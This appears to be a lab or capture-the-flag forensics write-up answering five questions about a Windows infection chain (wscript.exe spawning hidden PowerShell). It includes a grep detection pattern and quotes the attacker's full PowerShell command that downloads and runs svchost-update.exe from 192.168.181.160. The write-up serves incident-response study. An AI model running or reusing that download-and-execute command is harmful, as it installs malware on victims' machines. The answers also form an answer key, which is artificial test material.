# red

After extracting the archive, I searched the parsed artifacts for suspicious PowerShell, script execution, downloads, and payload names. Useful searches:
```bash
grep -Rni --binary-files=text -E "powershell|wscript|IWR|Invoke-WebRequest|Download|svchost-update|192\.168\.181\.160" redmod/
```

This revealed a suspicious JavaScript payload execution chain using `wscript.exe`, followed by hidden PowerShell downloading a second stage from `192.168.181.160`.

## Q1. What is the earliest time of infection?

The earliest infection time was not the PowerShell execution time. The first relevant infection artifact was the malicious ZIP/payload interaction beginning at: `2026-07-08 15:29:45`. This timestamp marks the earliest point in the infection chain before the payload was executed.

## Q2. When did the victim first interact with the actual payload?

The payload was executed through Windows Script Host. The event logs showed that `wscript.exe` launched the malicious script chain, then spawned PowerShell. The key process chain was:
```text
explorer.exe
  -> wscript.exe
      -> powershell.exe
          -> svchost-update.exe
```

The first interaction with the actual payload was recorded when PowerShell was started from `wscript.exe` at: `2026-07-08 15:31:02`

## Q3. What was used to execute the payload?

The malicious payload was executed by Windows Script Host using `wscript.exe`. The relevant AppId description was: `Windows Script Host - wscript.exe (64-bit)`

## Q4. What is the command line that downloaded the second stage?

The event logs showed `wscript.exe` spawning PowerShell with hidden window mode and no profile. PowerShell used `IWR` to download the second-stage executable from the attacker-controlled host and saved it to `$env:TEMP`. The command line was:
```text
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden -C "IWR http://192.168.181.160/updates/svchost-update.exe -OutFile $env:TEMP\svchost-update.exe; Start-Process $env:TEMP\svchost-update.exe"
```

## Q5. What directory was the second stage dropped into?

The PowerShell command downloaded the second stage as: `$env:TEMP\svchost-update.exe`

The resolved execution path appeared in AppCompatCache and BAM as: `C:\Users\systemid\AppData\Local\Temp\svchost-update.exe`

Therefore, the second stage was dropped into: `C:\Users\systemid\AppData\Local\Temp\`
